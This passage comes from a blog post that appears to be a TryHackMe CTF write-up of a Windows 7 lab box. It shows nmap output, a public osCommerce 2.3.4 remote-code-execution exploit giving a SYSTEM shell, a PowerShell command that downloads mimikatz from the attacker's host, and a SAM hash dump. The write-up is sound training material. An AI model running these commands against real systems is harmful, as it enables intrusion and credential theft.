</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/
</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
</span></span><span style=display:flex><span>|_
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|   Supported Methods: OPTIONS GET HEAD POST TRACE
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#d0a8ff>time</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#41a1c0>commonName</span>=localhost
</span></span><span style=display:flex><span>| Issuer: <span style=color:#41a1c0>commonName</span>=localhost
</span></span><span style=display:flex><span>| Public Key type: rsa
</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#d0bf69>1024</span>
</span></span><span style=display:flex><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style=display:flex><span>| Not valid before: 2009-11-10T23:48:47
</span></span><span style=display:flex><span>| Not valid after:  2019-11-08T23:48:47
</span></span><span style=display:flex><span>| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
</span></span><span style=display:flex><span>|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
</span></span><span style=display:flex><span>|_http-title: Index of /
</span></span><span style=display:flex><span>| tls-alpn: 
</span></span><span style=display:flex><span>|_  http/1.1
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds Windows <span style=color:#d0bf69>7</span> Home Basic <span style=color:#d0bf69>7601</span> Service Pack <span style=color:#d0bf69>1</span> microsoft-ds (workgroup: WORKGROUP)
</span></span><span style=display:flex><span>3306/tcp  open  mysql        MariaDB (unauthorized)
</span></span><span style=display:flex><span>8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|   Supported Methods: OPTIONS GET HEAD POST TRACE
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-title: Index of /
</span></span><span style=display:flex><span>| http-ls: Volume /
</span></span><span style=display:flex><span>| SIZE  TIME              FILENAME
</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/
</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
</span></span><span style=display:flex><span>| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
</span></span><span style=display:flex><span>|_
</span></span><span style=display:flex><span>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49159/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>49160/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span>Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: mean: -20m03s, deviation: 34m37s, median: -4s
</span></span><span style=display:flex><span>| smb-os-discovery: 
</span></span><span style=display:flex><span>|   OS: Windows <span style=color:#d0bf69>7</span> Home Basic <span style=color:#d0bf69>7601</span> Service Pack <span style=color:#d0bf69>1</span> (Windows <span style=color:#d0bf69>7</span> Home Basic 6.1)
</span></span><span style=display:flex><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1
</span></span><span style=display:flex><span>|   Computer name: BLUEPRINT
</span></span><span style=display:flex><span>|   NetBIOS computer name: BLUEPRINT<span style=color:#fc6a5d>\x</span><span style=color:#d0bf69>00</span>
</span></span><span style=display:flex><span>|   Workgroup: WORKGROUP<span style=color:#fc6a5d>\x</span><span style=color:#d0bf69>00</span>
</span></span><span style=display:flex><span>|_  System time: 2024-08-16T18:05:38+01:00
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   2:1:0: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-08-16T17:05:39
</span></span><span style=display:flex><span>|_  start_date: 2024-08-16T17:02:15
</span></span><span style=display:flex><span>| smb-security-mode: 
</span></span><span style=display:flex><span>|   account_used: guest
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: disabled (dangerous, but default)
</span></span><span style=display:flex><span>| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:a6:9b:93:fd:95 (unknown)
</span></span><span style=display:flex><span>| Names:
</span></span><span style=display:flex><span>|   BLUEPRINT&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style=display:flex><span>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style=display:flex><span>|   BLUEPRINT&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style=display:flex><span>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span style=display:flex><span>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span style=display:flex><span>|_  <span style=color:#fc6a5d>\x</span>01<span style=color:#fc6a5d>\x</span>02__MSBROWSE__<span style=color:#fc6a5d>\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span></code></pre></td></tr></table></div></div><p>So we can observe:</p><ul><li>Windows 7 Home SP1 / 7601 - wow that&rsquo;s quite old</li><li>IIS on Port 80</li><li>Apache 2.4.23 on Port 443 and 8080</li><li>OSCommerce 2.3.4</li><li>PHP 5.6.28</li><li>OpenSSL 1.0.2h</li><li>MSRPC on Port 135</li><li>Netbios on Port 139</li><li>SMB on Port 445 (stated as microsoft-ds)</li><li>mySQL/MariaDB on Port 3306</li><li>a few high ports with msrpc</li><li>SMB scan could already retrieve some data as guest</li></ul><p>All these outdated software&rsquo;s probably have some vulnerabilities that I can use.</p><h2 id=initial-access-oscommerce-234-exploit>Initial Access: osCommerce 2.3.4 Exploit<a hidden class=anchor aria-hidden=true href=#initial-access-oscommerce-234-exploit>#</a></h2><p>Nmap already found a installation of osCommerce - an Online Shop application. The directory name already hints the version: <code>2.3.4</code>.
I quickly searched on <a href=https://exploit-db.com target=_blank>Exploit-DB.com</a> for osCommerce and found <a href=https://www.exploit-db.com/exploits/50128 target=_blank>this exploit (EDB-ID 50128)</a> by Bryan Leong <code>&lt;NobodyAtall></code>.
The underlying issue is, if the <code>/install</code> directory wasn&rsquo;t removed after installation, it&rsquo;s possible to execute commands.</p><blockquote><p>Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php</p></blockquote><p>Since I have <code>searchsploit</code> installed on my Kali VM, I probably already have that exploit on disk:</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6c7986># find the path of the local exploit</span>
</span></span><span style=display:flex><span>searchsploit <span style=color:#d0bf69>50128</span> -p
</span></span><span style=display:flex><span>  Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)
</span></span><span style=display:flex><span>      URL: https://www.exploit-db.com/exploits/50128
</span></span><span style=display:flex><span>     Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
</span></span><span style=display:flex><span>    Codes: N/A
</span></span><span style=display:flex><span> Verified: False
</span></span><span style=display:flex><span>File Type: Python script, ASCII text executable
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># execute the exploit, using the URL of the osCommerce installation as a single parameter</span>
</span></span><span style=display:flex><span>python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://10.10.251.173:8080/oscommerce-2.3.4/catalog/
</span></span><span style=display:flex><span>[*] Install directory still available, the host likely vulnerable to the exploit.
</span></span><span style=display:flex><span>[*] Testing injecting system <span style=color:#d0a8ff>command</span> to <span style=color:#d0a8ff>test</span> vulnerability
</span></span><span style=display:flex><span>User: nt authority<span style=color:#fc6a5d>\s</span>ystem
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RCE_SHELL$ whoami
</span></span><span style=display:flex><span>nt authority<span style=color:#fc6a5d>\s</span>ystem
</span></span></code></pre></td></tr></table></div></div><p>Okay, great. I got a shell, and I&rsquo;m even running as <code>NT Authority\SYSTEM</code>. I think that&rsquo;s a major misconfiguration to have the webserver run as <code>SYSTEM</code>, but well&mldr; It&rsquo;s just an easy CTF game.</p><h2 id=retrieve-root-flag>Retrieve root flag<a hidden class=anchor aria-hidden=true href=#retrieve-root-flag>#</a></h2><p>In CTF&rsquo;s a root flag is often located on the Administrator&rsquo;s Desktop (if it&rsquo;s a Windows machine). So I checked the directory, using the RCE_Shell I got from the Exploit.</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>RCE_SHELL$ <span style=color:#d0a8ff>dir </span>C:\users\administrator\desktop
</span></span><span style=display:flex><span> Volume <span style=color:#fc5fa3>in</span> drive C has no label.
</span></span><span style=display:flex><span> Volume Serial Number is 14AF-C52C
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:\users\administrator\desktop
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#d0bf69>11</span>/<span style=color:#d0bf69>27</span>/<span style=color:#d0bf69>2019</span>  <span style=color:#d0bf69>07</span><span style=color:#960050>:</span><span style=color:#d0bf69>15</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span><span style=color:#d0bf69>11</span>/<span style=color:#d0bf69>27</span>/<span style=color:#d0bf69>2019</span>  <span style=color:#d0bf69>07</span><span style=color:#960050>:</span><span style=color:#d0bf69>15</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span><span style=color:#d0bf69>11</span>/<span style=color:#d0bf69>27</span>/<span style=color:#d0bf69>2019</span>  <span style=color:#d0bf69>07</span><span style=color:#960050>:</span><span style=color:#d0bf69>15</span> PM                <span style=color:#d0bf69>37</span> root.txt.txt
</span></span><span style=display:flex><span>               <span style=color:#d0bf69>1</span> File(s)             <span style=color:#d0bf69>37</span> bytes
</span></span><span style=display:flex><span>               <span style=color:#d0bf69>2</span> Dir(s)  <span style=color:#d0bf69>19</span>,<span style=color:#d0bf69>504</span>,<span style=color:#d0bf69>635</span>,<span style=color:#d0bf69>904</span> bytes free
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RCE_SHELL$ more C:\users\administrator\desktop\root.txt.txt
</span></span><span style=display:flex><span>THM{ **redacted to not ruin the fun** }
</span></span></code></pre></td></tr></table></div></div><h2 id=lab-user-ntlm-hash>&ldquo;Lab&rdquo; user NTLM hash<a hidden class=anchor aria-hidden=true href=#lab-user-ntlm-hash>#</a></h2><p>I already have the necessary permissions (again: I&rsquo;m running as <code>NT Authority\SYSTEM</code>). To retrieve the NTLM hash, I chose to spin up a simple local webserver on my Kali machine, to download mimikatz to the target system.</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#6c7986># in another terminal: spin up the webserver</span>
</span></span><span style=display:flex><span>python3 -m http.server <span style=color:#d0bf69>80</span>
</span></span></code></pre></td></tr></table></div></div><p>Then in the Exploit shell:</p><div class=highlight><div style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#fff;background-color:#1f1f24;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#6c7986># download mimikatz using PowerShell</span>
</span></span><span style=display:flex><span>RCE_SHELL$ powershell (<span style=color:#d0a8ff>New-Object</span> System.Net.WebClient).DownloadFile(\<span style=color:#fc6a5d>&#34;http://10.14.85.51/mimikatz.exe\&#34;</span>, \<span style=color:#fc6a5d>&#34;mimikatz.exe\&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6c7986># dump the local SAM database using mimikatz</span>
</span></span><span style=display:flex><span>RCE_SHELL$ mimikatz <span style=color:#fc6a5d>&#34;lsadump::sam&#34;</span> exit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  .<span style=color:#6c7986>#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26</span>
</span></span><span style=display:flex><span> .<span style=color:#6c7986>## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
</span></span><span style=display:flex><span> <span style=color:#6c7986>## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span style=display:flex><span> <span style=color:#6c7986>## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
</span></span><span style=display:flex><span> <span style=color:#fc6a5d>&#39;## v ##&#39;</span>       Vincent LE TOUX             ( vincent.letoux<span style=color:#41a1c0>@gmail</span>.com )
</span></span><span style=display:flex><span>  <span style=color:#fc6a5d>&#39;#####&#39;</span>        &gt; https<span style=color:#960050>:</span>//pingcastle.com / https<span style=color:#960050>:</span>//mysmartlogon.com ***/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz(commandline) <span style=color:#6c7986># lsadump::sam</span>
</span></span><span style=display:flex><span>Domain <span style=color:#960050>:</span> BLUEPRINT
</span></span><span style=display:flex><span>SysKey <span style=color:#960050>:</span> 147a48de4a9815d2aa479598592b086f
</span></span><span style=display:flex><span>Local SID <span style=color:#960050>:</span> S-<span style=color:#d0bf69>1</span>-<span style=color:#d0bf69>5</span>-<span style=color:#d0bf69>21</span>-<span style=color:#d0bf69>3130159037</span>-<span style=color:#d0bf69>241736515</span>-<span style=color:#d0bf69>3168549210</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SAMKey <span style=color:#960050>:</span> 3700ddba8f7165462130a4441ef47500
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  <span style=color:#960050>:</span> 000001f4 (<span style=color:#d0bf69>500</span>)
</span></span><span style=display:flex><span>User <span style=color:#960050>:</span> Administrator
</span></span><span style=display:flex><span>  Hash NTLM<span style=color:#960050>:</span> **redacted - to not spoil the fun**
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  <span style=color:#960050>:</span> 000001f5 (<span style=color:#d0bf69>501</span>)
</span></span><span style=display:flex><span>User <span style=color:#960050>:</span> Guest
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>RID  <span style=color:#960050>:</span> <span style=color:#d0bf69>000003e8</span> (<span style=color:#d0bf69>1000</span>)
</span></span><span style=display:flex><span>User <span style=color:#960050>:</span> Lab
</span></span><span style=display:flex><span>  Hash NTLM<span style=color:#960050>:</span> **redacted - to not spoil the fun**
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mimikatz(commandline) <span style=color:#6c7986># exit</span>
</span></span><span style=display:flex><span>Bye!
</span></span></code></pre></td></tr></table></div></div><p>Neat! So I took the NTLM hash for the <code>Lab</code> user and checked it using <a href=https://ntlm.pw target=_blank>NTLM.pw</a>. Since the password was pretty simple, it was listed there.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://diecknet.de/en/tags/tryhackme/>Tryhackme</a></li><li><a href=https://diecknet.de/en/tags/cyber-security/>Cyber Security</a></li></ul><div class=share-buttons></div></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://diecknet.de/en/>diecknet</a></span>
&nbsp;|&nbsp;
<span><a href=https://diecknet.de/en/legal/>Imprint</a>
</span>&nbsp;|&nbsp;<span>
<a href=https://diecknet.de/en/privacy/>Privacy</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script><script type=text/javascript>var _paq=window._paq||[];_paq.push(["disableCookies"]),_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){t="//nc.diecknet.de/mt/",_paq.push(["setTrackerUrl",t+"mdata"]),_paq.push(["setSiteId","1"]);var t,n=document,e=n.createElement("script"),s=n.getElementsByTagName("script")[0];e.type="text/javascript",e.async=!0,e.defer=!0,e.src=t+"m.js",s.parentNode.insertBefore(e,s)}()</script><noscript><p><img src="https://nc.diecknet.de/mt/mdata?idsite=1&amp;rec=1" style=border:0 alt></p></noscript></body></html>